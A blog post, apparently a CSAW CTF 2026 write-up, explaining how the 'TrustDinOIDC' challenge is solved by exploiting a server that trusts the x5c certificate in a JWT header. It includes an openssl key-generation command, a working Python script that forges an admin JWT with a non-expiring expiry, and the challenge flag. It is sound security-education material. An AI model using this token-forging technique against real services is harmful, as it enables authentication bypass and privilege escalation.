---
title: "CSAW CTF '26 Qualifications - web exploitation write-ups!"
slug: csaw-quals-26
description: Detailed solutions and methodologies for the CSAW CTF 2026 web exploitation challenges.
longDescription: This article breaks down the vulnerabilities and step-by-step solutions for the CSAW CTF 2026 web challenges to help you better understand web application security.
cardImage: "https://sloewlly.github.io/portfolio/pixel-art.webp"
tags: ["capture the flag", "cybersecurity", "csaw", "web-exploitation"]
readTime: 30
featured: true
timestamp: 2026-09-25T01:00:00+00:00
---

## TrustDinOIDC

This challenge is a fantastic deep dive into modern authentication flaws, specifically focusing on the exploitation of OAuth and JSON Web Tokens (JWT). It perfectly demonstrates what happens when developers trust user-supplied cryptographic material to dictate security policies.

https://dino2auth.ctf.csaw.io/

The objective is clear: escalate our privileges to log in as an administrator so we can redeem the elusive "flagosaurus."

When logging in normally via "StrataID" (the mock OAuth provider for this challenge), we are greeted with a standard user dashboard and handed a "freeosaurus":

<div class="flex w-full flex-col items-center text-center">
    <img
        src=https://iili.io/nABZSbs.png
        alt="image" 
        style="display: block; margin: 0 auto; max-width: 100%; border-radius: 8px;"
    />
</div>

To figure out what separates a standard guest from an admin, we need to look at how the application handles our session data. Firing up Burp Suite, I intercepted the OAuth authorization callback. The server sends over a hefty Base64-encoded string:

```text
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1YyI6WyJNSUlDeWpDQ0FiS2dBd0lCQWdJVWJDSFRxYVlsb2orLzk0Ym5SRWhDblRmV1NiY3dEUVlKS29aSWh2Y05BUUVMQlFBd0h6RWRNQnNHQTFVRUF3d1VjM1J5WVhSaGFXUXVaWGhoYlhCc1pTNWpiMjB3SGhjTk1qWXdPVEl3TVRjd09URXpXaGNOTWpjd09USXdNVGN3T1RFeldqQWZNUjB3R3dZRFZRUUREQlJ6ZEhKaGRHRnBaQzVsZUdGdGNHeGxMbU52YlRDQ0FTSXdEUVlKS29aSWh2Y05BUUVCQlFBRGdnRVBBRENDQVFvQ2dnRUJBS3pUVlkyRlRiKzU4MDVpcElDK0hNVDNUdWNNMW91NmpSQ2RuSnRURi9WeDhnS1Q0S29Ja3lNSERxYm9zN1dEa05CMm8ycncydXh5THBQeWJTZDVKQ0dkcWtMZ2lqR2NsaDRFaVdYSStnWkhxd0c3ZWtwbjBPY3hkMUF2YXZVeS9RNzNkSkZzUTlSbnlUR2pBMjQybHVEbEJOUS9UWFd2K1dlckhuR1BER3JNVHVPS3Awb2dLZDl5L0xWRFdxM08rVVhPdHVVTDBzL0xEVGYvR2V2L01qTFg3L0svYzVHQVJ1Skk3czNsdmZrV0wyem8zcWV4SWlFTUJ6QVdZUGJxN3dTZDVUZ1JHeGJ6WEV1ZGp1NmEvNUdWK3hoTGRpRENVWWcrcnpieHE4V2tVR2MxUVY3dW01VnlBQWNWZ1lIM0hnVXd4a01FOWtGRWcwSkNueXJ4OGEwQ0F3RUFBVEFOQmdrcWhraUc5dzBCQVFzRkFBT0NBUUVBR0JJeC9oeVhxVnNZdXMydGFqWWV2UWhrMEdxTlk5dUFnUDJ1b0xxYkRNNlZZbWc5dDNHbTlxbGV3Y01YbE85QTNXYnVVbG5Jbm8xWWhsUkdzZGlONUQ5SDJWeDRlNTk4Y0JCcnMyR2M3MTVsVVVCRCtkRzErblZnK0JLUjBFU2VTVFpsci8vV0FhZThvUnJJdVdQRHhoOUczVXUrK3AxdFNOSHpsRmNoMFZjWEp0ZlpGUElxZTc4MHg0UC9XUjUyMk1OSG9tdytPUlV3Mmo0RmkrSFpnNUN2VCt6RlRoRWl5TENxaGZDRldFVTdRR0hrSVJGd0pqNUo3VFFmRk5HaXY3RXVXV2lYZk5kczNaN01KSkd6WWVYdGk1ZzJkazh6bW5kRDhYcXFUM1VGblpOdmFEWUd0SkFhOHR4bDF1NTJtU1VWb0xsRU5reWdLcXNtVGZkckVBPT0iXX0.eyJpc3MiOiJzdHJhdGFpZC5leGFtcGxlLmNvbSIsInN1YiI6Imd1ZXN0IiwiYXVkIjoidHJ1c3RkaW5vaWRjLXBvcnRhbCIsInNjb3BlIjoib3BlbmlkIHByb2ZpbGUgZnJlZW9zYXVydXM6cmVkZWVtIiwiZXhwIjoxNzkwMTYxNjE0fQ.pqhsR5rY51N4EUY9BwitPrRcvE60XEKBHypiDrxmtQVw70dXi1MInYirX7qM-wFJ7hNpVBUkhfaUs3LPC0nr2k-3Aot59BCT3ZCwO3u5hzHDLXyAryJ0YFWSe-KwsEoGMZHPrQLVeZ-zHE2DARhmbGsISrowFsJGfXORBSe2pOBNJSU5Ie84y7TzZauzxD_GBPftfI9-ZZX-l_hDbY2SGV3Dg_AJW5yzAezvaY5s1fGJIxWJsRQkx76BGE63CBono1XSPZr8Qx2rrU5qj9wprWDtchiovBW2MRR010YqZjqFGJMuFPbwVFaMZ6gQxNNgdzzKAo1_O9dUq5F_0sHu_A
```
This is a JSON Web Token (JWT). JWTs consist of three parts: a header, a payload, and a signature. Decoding the first two segments reveals the inner workings of our session.

The header:

```
{
  "alg": "RS256",
  "typ": "JWT",
  "x5c": [
    "MIICyjCCAbKgAwIBAgIUbCHTqaYloj+/94bnREhCnTfWSbcwDQYJKoZIhvcNAQELBQAwHzEdMBsGA1UEAwwUc3RyYXRhaWQuZXhhbXBsZS5jb20wHhcNMjYwOTIwMTcwOTEzWhcNMjcwOTIwMTcwOTEzWjAfMR0wGwYDVQQDDBRzdHJhdGFpZC5leGFtcGxlLmNvbTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAKzTVY2FTb+5805ipIC+HMT3TucM1ou6jRCdnJtTF/Vx8gKT4KoIkyMHDqbos7WDkNB2o2rw2uxyLpPybSd5JCGdqkLgijGclh4EiWXI+gZHqwG7ekpn0Ocxd1AvavUy/Q73dJFsQ9RnyTGjA242luDlBNQ/TXWv+WerHnGPDGrMTuOKp0ogKd9y/LVDWq3O+UXOtuUL0s/LDTf/Gev/MjLX7/K/c5GARuJI7s3lvfkWL2zo3qexIiEMBzAWYPbq7wSd5TgRGxbzXEudju6a/5GV+xhLdiDCUYg+rzbxq8WkUGc1QV7um5VyAAcVgYH3HgUwxkME9kFEg0JCnyrx8a0CAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAGBIx/hyXqVsYus2tajYevQhk0GqNY9uAgP2uoLqbDM6VYmg9t3Gm9qlewcMXlO9A3WbuUlnIno1YhlRGsdiN5D9H2Vx4e598cBBrs2Gc715lUUBD+dG1+nVg+BKR0ESeSTZlr//WAae8oRrIuWPDxh9G3Uu++p1tSNHzlFch0VcXJtfZFPIqe780x4P/WR522MNHomw+ORUw2j4Fi+HZg5CvT+zFThEiyLCqhfCFWEU7QGHkIRFwJj5J7TQfFNGiv7EuWWiXfNds3Z7MJJGzYeXti5g2dk8zmndD8XqqT3UFnZNvaDYGtJAa8txl1u52mSUVoLlENkygKqsmTfdrEA=="
  ]
}
```

The payload:

```
{
  "iss": "strataid.example.com",
  "sub": "guest",
  "aud": "trustdinoidc-portal",
  "scope": "openid profile freeosaurus:redeem",
  "exp": 1790161616
}
```

Looking at the payload, the path to admin is obvious: we need to change our sub (subject) from guest to admin, and change our scope to include flagosaurus:redeem.

However, you can't just edit a JWT payload. If you change the data, the RSA signature at the end of the token becomes invalid, and the server will reject it. To forge the signature, we would need the server's private key—which we don't have.

But look closely at the JWT header. Notice the x5c parameter?

x5c stands for X.509 Certificate Chain. In a properly secured environment, the server uses its own securely stored public key to verify a token's signature. However, a notorious JWT misconfiguration occurs when the server extracts the public key directly from the x5c header provided in the token itself and uses that to verify the signature.

To put this into perspective: it is like handing a bouncer a fake ID, and when the bouncer asks how he knows the ID is real, you hand him your own custom-made UV flashlight that makes your fake watermark glow. You control both the lock and the key.

Because the server trusts the certificate passed in the header, we don't need to steal their private key. We just need to generate our own key pair, create our own certificate, sign our modified JWT with our new private key, and attach our certificate to the x5c header.

First, I used OpenSSL in my terminal to generate a fresh RSA private key and a self-signed certificate:

```
openssl req -x509 -newkey rsa:2048 -keyout private_key.pem -out cert.pem -days 365 -nodes
```

With my rogue keys generated, I wrote a Python script to forge the JWT. I noted from the original token that the certificate needed to be in DER format (binary) and Base64 encoded before being injected into the header.

Here is the exploit script that builds the master key:

```python

import jwt
import base64
from cryptography import x509
from cryptography.hazmat.primitives import serialization

# Convert PEM (text) to DER (binary) format for the x5c header
with open('cert.pem', 'rb') as f:
    cert = x509.load_pem_x509_certificate(f.read())
    cert_der = cert.public_bytes(serialization.Encoding.DER)
    cert_b64 = base64.b64encode(cert_der).decode()

# Construct the malicious header containing our rogue certificate
header = {
    "alg": "RS256",
    "typ": "JWT",
    "x5c": [cert_b64],
}

# Construct the malicious payload for privilege escalation
payload = {
    "iss": "strataid.example.com",
    "sub": "admin", # Elevated from guest
    "aud": "trustdinoidc-portal",
    "scope": "openid profile freeosaurus:redeem flagosaurus:redeem", # Added flagosaurus
    "exp": 9999999999 # Tokens never die
}

# Sign the forged JWT with our generated private key
with open('private_key.pem', 'r') as f:
    private_key = f.read()

token = jwt.encode(payload, private_key, algorithm="RS256", headers=header)
print(token)

```

Running this script spits out a brand new JWT. I hopped back into Burp Suite, swapped out the original token with my malicious payload in the HTTP request, and forwarded it to the server.

Because of the x5c misconfiguration, the server parsed my token, used my injected certificate to verify my injected signature, and blindly accepted the authentication. The application granted me admin access, and the flagosaurus was mine!

The core takeaway? Never blindly trust cryptographic material supplied by the client. Servers should always validate JWTs against a hardcoded, trusted public key or a secure JWKS endpoint.

<details>
  <summary><strong>Click to reveal flag</strong></summary>
  
  ```text
  csaw{str4ta_sk1pped_th3_p1n}
  ```
</details>